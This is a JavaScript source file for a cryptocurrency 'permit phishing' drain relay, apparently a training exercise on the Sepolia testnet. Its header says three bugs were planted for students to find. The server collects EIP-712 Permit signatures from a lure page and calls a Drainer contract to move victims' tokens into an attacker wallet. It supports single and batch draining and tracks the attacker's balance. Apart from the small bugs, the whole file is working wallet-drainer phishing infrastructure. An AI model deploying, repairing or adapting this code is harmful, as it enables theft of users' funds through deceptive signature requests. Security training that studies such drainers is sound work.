/**
 * Method 01 — Permit Phishing Drain Server  [EXERCISE COPY]
 *
 * Receives EIP-712 Permit signatures from the lure page,
 * validates them, and executes permit() + transferFrom() via the Drainer contract.
 *
 * Deployed on Sepolia. Relay runs on localhost:3456.
 *
 * NOTE: This copy has been deliberately modified. It does NOT work.
 *       Find the 3 bugs that cause the attack to fail.
 */

import express from "express";
import { ethers } from "ethers";
import { readFileSync } from "fs";
import { dirname, join } from "path";
import { fileURLToPath } from "url";

const __dirname = dirname(fileURLToPath(import.meta.url));

/* ── CONFIG ─────────────────────────────────────────────────────── */
const RPC_URL       = process.env.RPC_URL       || "https://ethereum-sepolia-rpc.publicnode.com";
const ATTACKER_KEY  = process.env.ATTACKER_KEY  || "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80";
const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS || "0x0000000000000000000000000000000000000001";
const DRAINER_ADDR  = process.env.DRAINER_ADDR  || "0x0000000000000000000000000000000000000002";
const PORT          = parseInt(process.env.PORT || "3456", 10);

/* ── ABI ────────────────────────────────────────────────────────── */
const DRAINER_ABI = [
  "function drain(address token, address victim, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
  "function drainBatch(address token, address[] victims, uint256[] amounts, uint256[] deadlines, uint8[] vs, bytes32[] rs, bytes32[] ss) external",
  "function owner() view returns (address)"
];

const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function symbol() view returns (string)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function name() view returns (string)"
];

/* ── PROVIDERS & WALLETS ────────────────────────────────────────── */
const provider       = new ethers.JsonRpcProvider(RPC_URL);
const attackerWallet = new ethers.Wallet(ATTACKER_KEY, provider);
const drainer        = new ethers.Contract(DRAINER_ADDR, DRAINER_ABI, attackerWallet);
const token          = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, attackerWallet);

/* ── STATE ──────────────────────────────────────────────────────── */
const permits   = [];
const drains    = [];
const ts = () => new Date().toISOString();

/* ── EXPRESS ────────────────────────────────────────────────────── */
const app = express();
app.use(express.json());

/* CORS — allow the lure page (served on port 3000) to reach this relay */
app.use((_req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET,OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (_req.method === "OPTIONS") return res.sendStatus(204);
  next();
});

app.get("/", (_req, res) => {
  res.json({
    service: "Method 01 — Permit Phishing Drain Relay",
    network: "Sepolia",
    pendingPermits: permits.filter(p => !p.executed).length,
    completedDrains: drains.length,
    drainerContract: DRAINER_ADDR,
    tokenContract: TOKEN_ADDRESS
  });
});

/* Receive permit signature from lure page */
app.post("/api/permit", async (req, res) => {
  try {
    const { user, tokenAddress, owner, spender, value, deadline, v, r, s, signature, chainId } = req.body;

    console.log(`[${ts()}] 📨 Permit received from ${user}`);

    /* Validate signature matches expected spender */
    if (spender.toLowerCase() !== attackerWallet.address.toLowerCase()) {
      console.log(`[${ts()}] ⚠ Spender mismatch — expected ${attackerWallet.address}, got ${spender}`);
    }

    permits.push({
      user, tokenAddress, owner, spender, value, deadline,
      v: parseInt(v), r, s, signature, chainId,
      timestamp: ts(), executed: false
    });

    res.json({ ok: true, index: permits.length - 1 });
  } catch (e) {
    console.error(`[${ts()}] Error:`, e.message);
    res.status(400).json({ error: e.message });
  }
});

/* List pending permits */
app.get("/api/pending", (_req, res) => {
  const pending = permits.filter(p => !p.executed);
  res.json({ permits: pending, count: pending.length });
});

/* Drain a single victim via Drainer contract */
app.post("/api/drain", async (req, res) => {
  try {
    const { index } = req.body;
    const permit = permits[0];
    if (!permit) return res.status(400).json({ error: "Permit not found" });
    if (permit.executed) return res.status(400).json({ error: "Already executed" });

    console.log(`[${ts()}] 🚨 Draining ${permit.user} via Drainer contract...`);

    const tx = await drainer.drain(
      permit.owner,
      permit.tokenAddress,
      permit.value,
      permit.deadline,
      permit.v,
      permit.r,
      permit.s
    );

    console.log(`[${ts()}] Tx submitted: ${tx.hash}`);
    const receipt = await tx.wait();
    console.log(`[${ts()}] ✅ Confirmed in block ${receipt.blockNumber}`);

    const decimals  = await token.decimals();
    const sym       = await token.symbol();
    const balance   = await token.balanceOf(attackerWallet.address);
    const formatted = ethers.formatUnits(balance, decimals);

    permits[index].executed = true;
    permits[index].txHash = tx.hash;
    permits[index].blockNumber = receipt.blockNumber;

    drains.push({
      user: permit.user, txHash: tx.hash,
      block: receipt.blockNumber, timestamp: ts()
    });

    res.json({
      ok: true,
      txHash: tx.hash,
      block: receipt.blockNumber,
      attackerBalance: `${formatted} ${sym}`
    });
  } catch (e) {
    console.error(`[${ts()}] Drain failed:`, e.message);
    res.status(500).json({ error: e.message });
  }
});

/* Batch drain all pending */
app.post("/api/drain-all", async (_req, res) => {
  const pending = permits.filter(p => !p.executed);
  if (pending.length === 0) return res.json({ results: [], total: 0 });

  try {
    const tx = await drainer.drainBatch(
      TOKEN_ADDRESS,
      pending.map(p => p.owner),
      pending.map(p => p.value),
      pending.map(p => p.deadline),
      pending.map(p => p.v),
      pending.map(p => p.r),
      pending.map(p => p.s)
    );
    const receipt = await tx.wait();

    pending.forEach((p, i) => {
      p.executed = true;
      p.txHash = tx.hash;
      drains.push({ user: p.user, txHash: tx.hash, block: receipt.blockNumber, timestamp: ts() });
    });

    res.json({ ok: true, txHash: tx.hash, block: receipt.blockNumber, drained: pending.length });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

/* Stats */
app.get("/api/stats", async (_req, res) => {
  try {
    const bal = await token.balanceOf(attackerWallet.address);
    const dec = await token.decimals();
    const sym = await token.symbol();
    res.json({
      attackerBalance: `${ethers.formatUnits(bal, dec)} ${sym}`,
      pendingPermits: permits.filter(p => !p.executed).length,
      completedDrains: drains.length
    });
  } catch (e) { res.json({ error: e.message }); }
});

/* Drain log */
app.get("/api/log", (_req, res) => res.json({ log: drains, count: drains.length }));

/* ── START ──────────────────────────────────────────────────────── */
app.listen(PORT, () => {
  console.log(`\n🚨 Method 01 — Permit Phishing Drain Server [EXERCISE COPY]`);
  console.log(`   Network:    Sepolia`);
  console.log(`   Attacker:   ${attackerWallet.address}`);
  console.log(`   Token:      ${TOKEN_ADDRESS}`);
  console.log(`   Drainer:    ${DRAINER_ADDR}`);
  console.log(`   Server:     http://localhost:${PORT}`);
  console.log(`\n   POST /api/permit     — receive permit signature`);
  console.log(`     GET  /api/pending    — list pending permits`);
  console.log(`     POST /api/drain      — drain single { index }`);
  console.log(`     POST /api/drain-all  — batch drain all`);
  console.log(`     GET  /api/stats      — attacker stats`);
  console.log(`     GET  /api/log        — drain history\n`);
});